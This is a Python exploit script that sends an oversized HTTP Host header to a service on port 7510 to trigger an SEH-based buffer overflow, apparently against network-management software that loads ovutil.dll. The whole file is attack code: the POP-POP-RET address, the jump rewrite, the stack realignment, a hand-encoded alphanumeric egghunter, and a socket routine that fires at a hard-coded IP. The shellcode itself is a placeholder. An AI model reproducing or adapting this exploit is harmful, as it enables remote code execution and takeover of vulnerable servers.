#!/usr/bin/python
#EmreOvunc

from socket import socket
from socket import AF_INET
from socket import SOCK_STREAM

#ovutil.dll -> 0x5A 44 74 5F
#POP EBX - POP - RET
seh = "\x5F\x74\x44\x5A"
#Break point -> shift + f9

#Jump over 4 bytes
#JMP SHORT 1035FE3C
#Converting -> jmp = "\xEB\x04\x90\x90" to new jmp
jmp = "\x4C\x4C\x77\x04"

#x90 is in the badchar list.
nops = "\x43" * 2

#Save ESP
#PUSH ESP
#POP EBX
savESP = "\x54\x5B"

#Restore ESP
#PUSH EBX
#POP ESP
#restorESP = "\x53\x5C"

#Change ESP address -> 0x 10 35 FF 85
#SUB EAX,52446632
#SUB EAX,22222222
#SUB EAX,7B637827
#PUSH EAX
#POP ESP
changESP = ""
changESP += savESP
changESP += "\x2D\x32\x66\x44\x52" + "\x2D\x22\x22\x22\x22" + "\x2D\x27\x78\x63\x7B" + "\x50" + "\x5C" + nops
nops += changESP

egghead = "T00WT00W"

#Egghunter..  manually encoded.
egghunter = ""
egghunter += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x41\x41"

#Change ESP
egghunter += "\x2D\x32\x66\x44\x52" + "\x2D\x22\x22\x22\x22" + "\x2D\x27\x78\x63\x7B" + "\x50\x5C"

#Egghunter.. continue
egghunter += "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x21\x55\x55\x55\x2D\x21"
egghunter += "\x54\x55\x55\x2D\x49\x6F\x55\x6D\x50\x41\x41\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A\x2D\x71\x21\x61\x75\x2D\x71\x21\x61\x75\x2D"
egghunter += "\x6F\x47\x53\x65\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x2D\x44\x41\x7E\x58\x2D\x44\x34\x7E\x58\x2D\x48\x33\x78\x54"
egghunter += "\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x71\x7A"
egghunter += "\x31\x45\x2D\x31\x7A\x31\x45\x2D\x6F\x52\x48\x45\x50\x41\x41\x25"
egghunter += "\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x33\x73\x31\x2D\x2D\x33"
egghunter += "\x33\x31\x2D\x2D\x5E\x54\x43\x31\x50\x41\x41\x25\x4A\x4D\x4E\x55"
egghunter += "\x25\x35\x32\x31\x2A\x2D\x45\x31\x77\x45\x2D\x45\x31\x47\x45\x2D"
egghunter += "\x74\x45\x74\x46\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31"
egghunter += "\x2A\x2D\x52\x32\x32\x32\x2D\x31\x31\x31\x31\x2D\x6E\x5A\x4A\x32"
egghunter += "\x50\x41\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x2D"
egghunter += "\x77\x44\x2D\x31\x2D\x77\x44\x2D\x38\x24\x47\x77\x50"

bof = "A" * (3381-len(jmp)) + jmp + seh + nops + egghunter + "C" * (615-len(nops)-len(egghunter))

request = "GET /topology/homeBaseView HTTP/1.1\r\n"
request += "Host: " + bof + "\r\n"
request += "Content-Type: application/x-www-form-urlencoded\r\n"
request += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
request += "Content-Length: 1048580\r\n\r\n"

#Run shellcode in unrestricted buffer
shellcode = egghead + "C" * 1500
request += shellcode

expl = socket ( AF_INET, SOCK_STREAM )
expl.connect(("10.10.0.1", 7510))
expl.send(request)
expl.close()
